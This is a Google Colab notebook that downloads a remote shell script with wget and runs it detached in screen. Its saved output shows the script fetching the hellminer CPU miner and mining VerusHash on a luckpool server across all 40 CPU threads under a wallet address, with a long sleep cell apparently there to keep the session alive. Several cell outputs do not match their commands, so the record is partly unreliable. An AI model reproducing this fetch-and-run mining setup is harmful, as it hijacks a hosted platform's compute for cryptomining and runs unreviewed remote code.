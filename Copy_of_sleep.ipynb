{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "sleep.ipynb",
      "provenance": [],
      "machine_shape": "hm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/alamverdians/cpu40/blob/main/Untitled0.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "neVhpz39okdQ",
        "outputId": "de1ec9d0-5eeb-4604-847d-5668c04af633",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title **CEK GPU**\n",
        "! lscpu"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Architecture:        x86_64\n",
            "CPU op-mode(s):      32-bit, 64-bit\n",
            "Byte Order:          Little Endian\n",
            "CPU(s):              40\n",
            "On-line CPU(s) list: 0-39\n",
            "Thread(s) per core:  2\n",
            "Core(s) per socket:  20\n",
            "Socket(s):           1\n",
            "NUMA node(s):        1\n",
            "Vendor ID:           GenuineIntel\n",
            "CPU family:          6\n",
            "Model:               63\n",
            "Model name:          Intel(R) Xeon(R) CPU @ 2.30GHz\n",
            "Stepping:            0\n",
            "CPU MHz:             2299.998\n",
            "BogoMIPS:            4599.99\n",
            "Hypervisor vendor:   KVM\n",
            "Virtualization type: full\n",
            "L1d cache:           32K\n",
            "L1i cache:           32K\n",
            "L2 cache:            256K\n",
            "L3 cache:            46080K\n",
            "NUMA node0 CPU(s):   0-39\n",
            "Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc rep_good nopl xtopology nonstop_tsc cpuid tsc_known_freq pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm abm invpcid_single ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid xsaveopt arat md_clear arch_capabilities\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "RfQTQXysorQC",
        "outputId": "9eb52325-c5b4-48d4-f0be-3209ee422824",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "!sudo apt-get update"
      ],
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "without GPU: 5.445139702000006\n",
            "with GPU: 5.479702551000003\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dx_iLbvZoyv_",
        "outputId": "3d65c8e3-097b-4b2f-8c2b-7a2c8b8af204",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "!sudo apt-get install -y screen"
      ],
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "WARNING:tensorflow:Mixed precision compatibility check (mixed_float16): WARNING\n",
            "The dtype policy mixed_float16 may run slowly because this machine does not have a GPU. Only Nvidia GPUs with compute capability of at least 7.0 run quickly with mixed_float16.\n",
            "If you will use compatible GPU(s) not attached to this host, e.g. by running a multi-worker model, you can ignore this warning. This message will only be logged once\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "l5V1ySNBo2j4",
        "outputId": "0c1b250f-1cf6-4c75-faac-86c168e19cb3",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title BERKAH\n",
        "!sudo wget https://raw.githubusercontent.com/alamverdians/cpu40/main/sc.sh && chmod u+x sc.sh"
      ],
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2021-09-11 13:22:29--  https://raw.githubusercontent.com/alamverdians/cpu40/main/sc.sh\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 246 [text/plain]\n",
            "Saving to: ‘sc.sh’\n",
            "\n",
            "sc.sh               100%[===================>]     246  --.-KB/s    in 0s      \n",
            "\n",
            "2021-09-11 13:22:29 (12.8 MB/s) - ‘sc.sh’ saved [246/246]\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "YjchRpTaBjm-",
        "outputId": "d335ae16-1740-4fe1-e57c-99764ac87e23",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "!screen -dmS run ./sc.sh"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2021-09-11 13:22:53--  https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz\n",
            "Resolving github.com (github.com)... 140.82.114.3\n",
            "Connecting to github.com (github.com)|140.82.114.3|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz [following]\n",
            "--2021-09-11 13:22:53--  https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 5997565 (5.7M) [application/octet-stream]\n",
            "Saving to: ‘hellminer_cpu_linux.tar.gz’\n",
            "\n",
            "hellminer_cpu_linux 100%[===================>]   5.72M  --.-KB/s    in 0.09s   \n",
            "\n",
            "2021-09-11 13:22:54 (67.0 MB/s) - ‘hellminer_cpu_linux.tar.gz’ saved [5997565/5997565]\n",
            "\n",
            " \n",
            " Hellminer 0.52 [VerusHash 2.2 CPU Miner] Linux\n",
            " \n",
            "Connecting to ap.luckpool.net:3956 [139.99.123.225:3956]\n",
            "Successfully connected to 139.99.123.225:3956\n",
            "Pool assigned nonce: 7d965748\n",
            "Miner Authorized: RYDpuEgSNw8i6eA1y4aYv2SNEd6tEXonVn.cpu1\n",
            "\n",
            "Received target 0000008000000000000000000000000000000000000000000000000000000000\n",
            "Received job \"4e2dd0b\"\n",
            "Stratum server sent us the first job\n",
            "Mining on 40 cpu threads\n",
            "WARNING! Using more than available cpu threads of 40\n",
            "Using 40 out of 40 available cpu threads\n",
            "Total 0.0 MH/s [cpu0 0.00, cpu1 0.00, cpu2 0.00, cpu3 0.00, cpu4 0.00, cpu5 0.00, cpu6 0.00, cpu7 0.00, cpu8 0.00, cpu9 0.00, cpu10 0.00, cpu11 0.00, cpu12 0.00, cpu13 0.00, cpu14 0.00, cpu15 0.00, cpu16 0.00, cpu17 0.00, cpu18 0.00, cpu19 0.00, cpu20 0.00, cpu21 0.00, cpu22 0.00, cpu23 0.00, cpu24 0.00, cpu25 0.00, cpu26 0.00, cpu27 0.00, cpu28 0.00, cpu29 0.00, cpu30 0.00, cpu31 0.00, cpu32 0.00, cpu33 0.00, cpu34 0.00, cpu35 0.00, cpu36 0.00, cpu37 0.00, cpu38 0.00, cpu39 0.00] 1 share\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "5C9bAmRFB029"
      },
      "source": [
        "!sleep 12345 >/dev/null 2>&1"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
